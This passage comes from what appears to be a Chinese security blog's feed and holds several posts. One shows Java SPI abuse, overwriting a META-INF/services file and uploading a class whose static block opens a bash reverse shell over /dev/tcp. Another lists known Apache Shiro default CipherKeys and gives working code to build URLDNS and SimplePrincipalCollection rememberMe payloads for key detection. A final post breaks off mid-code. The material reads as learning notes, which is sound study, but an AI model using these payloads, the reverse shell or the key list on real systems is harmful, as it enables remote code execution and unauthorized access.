<span class="keyword">class</span> <span class="title class_">SpiServiceA</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceA.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiServiceB.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiServiceB</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SpiServiceB.Hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SpiTest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.ServiceLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpiTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            init();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">        ServiceLoader&lt;SpiService&gt; serviceLoader = ServiceLoader.load(SpiService.class);</span><br><span class="line">        Iterator&lt;SpiService&gt; iterator = serviceLoader.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">SpiService</span> <span class="variable">spiService</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            spiService.hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后定义META-INF/services<br><img src="https://user-images.githubusercontent.com/63966847/146678546-94e017c7-15a4-41f3-8082-4a0083c9b903.png" alt="image-20211219220826826"></p><p>然后run之后会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SpiServiceA.Hello</span><br><span class="line">SpiServiceB.Hello</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>也就是我们可以通过spi机制去获得实现接口的类并且实例化去调用方法。</p><p>调用<strong>next方法</strong>的时候，实际调用到的是，lookupIterator.nextService。它通过反射的方式，创建实现类的实例并返回。</p><p><img src="https://user-images.githubusercontent.com/63966847/146678550-d158915b-fd15-4b20-a588-063ed76e7f8c.png" alt="image-20211219221208548"></p><p><img src="https://user-images.githubusercontent.com/63966847/146678553-aede21be-261d-4077-9f21-a5ca8d60c4ec.png" alt="image-20211219221324358"></p><p>需要注意一点如何获得 <strong>cn</strong>这个变量勒，也就是spi实例化什么东西？这个其实是在 <strong>META-INF/services/com.firebasky.spi.SpiService</strong>中配置的。</p><h2 id="新思路"><a href="#新思路" class="headerlink" title="新思路"></a>新思路</h2><p>那问题来了？</p><p><strong>环境存在路径穿越上传文件会造成rce?</strong> 会的。</p><p>如何实现？</p><p>我们上传META-INF/services/com.firebasky.spi.SpiService文件并且覆盖其中的值，写入我们的恶意类的全类名比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.firebasky.spi.evil</span><br></pre></td></tr></table></figure><p>然后我们在target\classes\下上传我们的evil.class，然后让其在一次的执行spi的操作。就可以成功rce.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#evil.java</span><br><span class="line"><span class="keyword">package</span> com.firebasky.spi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evial</span> <span class="keyword">implements</span> <span class="title class_">SpiService</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException ee)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class 之后上传到target\classes\</p><p><img src="https://user-images.githubusercontent.com/63966847/146678561-9958bc94-f179-4440-97c4-fbdd2f7e03de.png" alt="image-20211219222014485"></p><p>在覆盖META-INF/services/com.firebasky.spi.SpiService</p><p><img src="https://user-images.githubusercontent.com/63966847/146678565-b5a349de-0fa3-4285-ae4c-3ce8a893bae7.png" alt="image-20211219222049642"></p><p>之后执行一下SpiTest。<br><img src="https://user-images.githubusercontent.com/63966847/146678572-60f7cfe5-32cf-4a40-9cca-b4a9d452d966.png" alt="image-20211219222131132"></p><p>其实也不是什么新思路,很多大师傅在实现写文件rce的时候就用到了,说不定ctf中可能遇到？？？</p><blockquote><p>参考： </p><p><a href="https://www.cnblogs.com/xrq730/p/11440174.html">https://www.cnblogs.com/xrq730/p/11440174.html</a></p><p><a href="https://www.jianshu.com/p/3a3edbcd8f24">https://www.jianshu.com/p/3a3edbcd8f24</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SPI机制&quot;&gt;&lt;a href=&quot;#SPI机制&quot; class=&quot;headerlink&quot; title=&quot;SPI机制&quot;&gt;&lt;/a&gt;SPI机制&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;最开始接触是springboot写文件rce里面的charsets遇到了，然后发现yaml</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/"/>
    <id>http://example.com/2022/11/19/Thinking_in_java%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</id>
    <published>2022-11-19T12:08:37.983Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/">https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://muxiaobai.github.io/2019/10/12/Thinking-in-java-%E9%AB%98%E7%BA%A7%E4%B9%8Bvolatile/&quot;&gt;https://muxiaobai.github.io/2019/1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/"/>
    <id>http://example.com/2022/11/19/shiro%E4%B9%8Bkey%E7%9A%84%E6%A3%80%E6%B5%8B/</id>
    <published>2022-11-19T12:08:37.977Z</published>
    <updated>2022-11-04T08:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro之key的检测"><a href="#Shiro之key的检测" class="headerlink" title="Shiro之key的检测"></a>Shiro之key的检测</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在说 key 的检测之前，先聊聊现在工具普遍用到的 key 吧。相信在了解 shiro 之前，大家都曾用过网上公开的 shiro 利用工具，其中对于 key 的检测，普遍采用的字典的形式进行爆破，这里列举几个在字典中存在的 key：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br><span class="line">2AvVhdsgUs0FSA3SDFAdag==</span><br><span class="line">3AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">4AvVhmFLUs0KTA3Kprsdag==</span><br><span class="line">5aaC5qKm5oqA5pyvAAAAAA==</span><br><span class="line">6ZmI6I2j5Y+R5aSn5ZOlAA==</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><p>第一个大家应该都眼熟了，是 1.2.4 版本的默认 CipherKey，那其他 CipherKey 是哪里来的呢？网上有几种观点：</p><ul><li>一个框架配置了某一个 Shiro CipherKey，大家写的项目都用到了该框架；</li><li>大家的项目互相抄来抄去，对于 CipherKey 并未修改；</li><li>见到其他项目使用该 CipherKey，也沿袭着使用了；</li><li>……</li></ul><p>我们尝试在 github 上搜索其中一个 CipherKey 试试<br><img src="images/image-20221023221126506.png" alt="image-20221023221126506"></p><p>发现大部分项目都是使用了同一个 CipherKey，缘，妙不可言~</p><p>言归正传，说回 Key 的检测，第一想法都是用 URLDNS 这条链子来进行检测。但实战环境中，很多时候遇上的主机都是不出网，这种情况如何解决呢？</p><p>L1NK3R 师傅提出的只依赖于 Shiro 本身，在 CipherKey 检测正确时不返回 deleteMe，错误情况时返回 deleteMe 的方法，解决了上述不出网的情况。下面就逐个进行学习一下。</p><h2 id="基于URLDNS的检测方法"><a href="#基于URLDNS的检测方法" class="headerlink" title="基于URLDNS的检测方法"></a>基于URLDNS的检测方法</h2><p>通过前面的学习，听到该方法名字应该都已经懂如何构造了，先通过学习的 URLDNS 链生成文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://851bdcd2.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再通过 Shiro 的<code>AesCipherService()</code>方法对前面生成的文件进行 AES 加密得到 payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加到 rememberMe 字段发送 payload<br><img src="images/image-20221024055133461.png" alt="image-20221024055133461"></p><p>最后执行反序列化流程，执行 URLDNS 链，发起 DNS 请求，打开平台看到已经收到了请求数据。<br><img src="images/image-20221024055148343.png" alt="image-20221024055148343"></p><h2 id="基于Shiro本身的检测方法"><a href="#基于Shiro本身的检测方法" class="headerlink" title="基于Shiro本身的检测方法"></a>基于Shiro本身的检测方法</h2><p>经过测试我们可以看到，在登录后携带正常的 rememberMe 发送请求并不会在返回包中存在<code>rememberMe=deleteMe</code>，但使用正确或者错误的 CipherKey 加密构造的 rememberMe 在发送请求后，都会在返回包中看到<code>rememberMe=deleteMe</code>的响应头。</p><p>那么如果我们能够使正确的 CipherKey 加密的 payload 执行后不回显<code>deleteMe</code>，错误的 CipherKey 加密的则回显<code>deleteMe</code>，那就能达到检测 CipherKey 是否正确的目的。</p><p>接下来的任务就是看看 CipherKey 正确和错误的情况下，流程是怎么走的，进行对比和分析。</p><h3 id="密钥错误"><a href="#密钥错误" class="headerlink" title="密钥错误"></a>密钥错误</h3><p>我们把断点打在最后的<code>AbstractRememberMeManager#deserialize()</code>方法处，然后用一个错误的 CipherKey 加密 URLDNS 的链子，发送请求<br><img src="images/image-20221024045034551.png" alt="image-20221024045034551"></p><p>接在跟进<code>decrypt()</code>方法直到<code>crypt()</code>方法<br><img src="images/image-20221024045303583.png" alt="image-20221024045303583"></p><p>在这里开始因为 CipherKey 错误抛出异常，在<code>getRememberedPrincipals()</code>方法中被捕获异常<br><img src="images/image-20221024045432663.png" alt="image-20221024045432663"></p><p>这里调用到了<code>onRememberedPrincipalFailure()</code>方法，跟进该方法<br><img src="images/image-20221024045929862.png" alt="image-20221024045929862"></p><p>接着调用了<code>forgetIdentity()</code>方法<br><img src="images/image-20221024050022401.png" alt="image-20221024050022401"></p><p>继续跟进<code>forgetIdentity(request, response)</code>方法<br><img src="images/image-20221024050046499.png" alt="image-20221024050046499"></p><p>调用到了<code>removeFrom()</code>方法，继续跟进<code>removeFrom()</code>方法<br><img src="images/image-20221024050136826.png" alt="image-20221024050136826"></p><p>可以看到，在该方法中定义了<code>deleteMe</code>字段并添加到响应头中</p><h3 id="密钥正确"><a href="#密钥正确" class="headerlink" title="密钥正确"></a>密钥正确</h3><p>因为 CipherKey 正确，所以这里进入了<code>doFinal()</code>方法，不会抛出异常<br><img src="images/image-20221024050454922.png" alt="image-20221024050454922"></p><p>然后一层层返回，最后到了 <code>return this.deserialize()</code>方法<br><img src="images/image-20221024050745000.png" alt="image-20221024050745000"></p><p>跟进<code>deserialize()</code>方法<br><img src="images/image-20221024050817471.png" alt="image-20221024050817471"></p><p>这里可以看到最后套了一层<code>(PrincipalCollection)</code>将返回的类转换成<code>PrincipalCollection</code>类，但转换失败，被<code>getRememberedPrincipals()</code>捕获了异常<br><img src="images/image-20221024051026334.png" alt="image-20221024051026334"></p><p>接下来就是跟前面一样进入到了<code>removeFrom()</code>方法<br><img src="images/image-20221024051128859.png" alt="image-20221024051128859"></p><p>至此，弄懂了 CipherKey 无论正确与否，进行加密的链子都会返回<code>deleteMe</code>的原因。</p><h3 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h3><p>既然在 CipherKey 正确情况下，是因为类型强转导致的进入<code>removeFrom()</code>方法，那么我们只要将序列化的对象继承于<code>PrincipalCollection</code>类即可，那就找一下<code>PrincipalCollection</code>类的实现类<img src="images/image-20221024051738473.png" alt="image-20221024051738473"></p><p>这里选择<code>SimplePrincipalCollection</code>类或者<code>SimplePrincipalMap</code>类都可以</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.SimplePrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimplePrincipalCollection</span> <span class="variable">simplePrincipalCollection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimplePrincipalCollection</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(simplePrincipalCollection), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(Object obj) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>密钥✅的情况：<br><img src="images/image-20221024055251820.png" alt="image-20221024055251820"></p><p>密钥❎的情况：<br><img src="images/image-20221024055335648.png" alt="image-20221024055335648"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Shiro之key的检测&quot;&gt;&lt;a href=&quot;#Shiro之key的检测&quot; class=&quot;headerlink&quot; title=&quot;Shiro之key的检测&quot;&gt;&lt;/a&gt;Shiro之key的检测&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/searchobj/"/>
    <id>http://example.com/2022/11/19/searchobj/</id>
    <published>2022-11-19T12:08:37.963Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="seacherobj"><a href="#seacherobj" class="headerlink" title="seacherobj"></a>seacherobj</h1><blockquote><p>学习一下searcherobj的方法</p><p><a href="https://blog.csdn.net/dhklsl/article/details/83992950">https://blog.csdn.net/dhklsl/article/details/83992950</a> </p><p><a href="https://blog.csdn.net/dhklsl/article/details/84751008">https://blog.csdn.net/dhklsl/article/details/84751008</a></p><p><a href="https://blog.csdn.net/dhklsl/article/details/88245460">https://blog.csdn.net/dhklsl/article/details/88245460</a></p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>一个一个的去寻找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是List或者ArrayList</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isList</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> 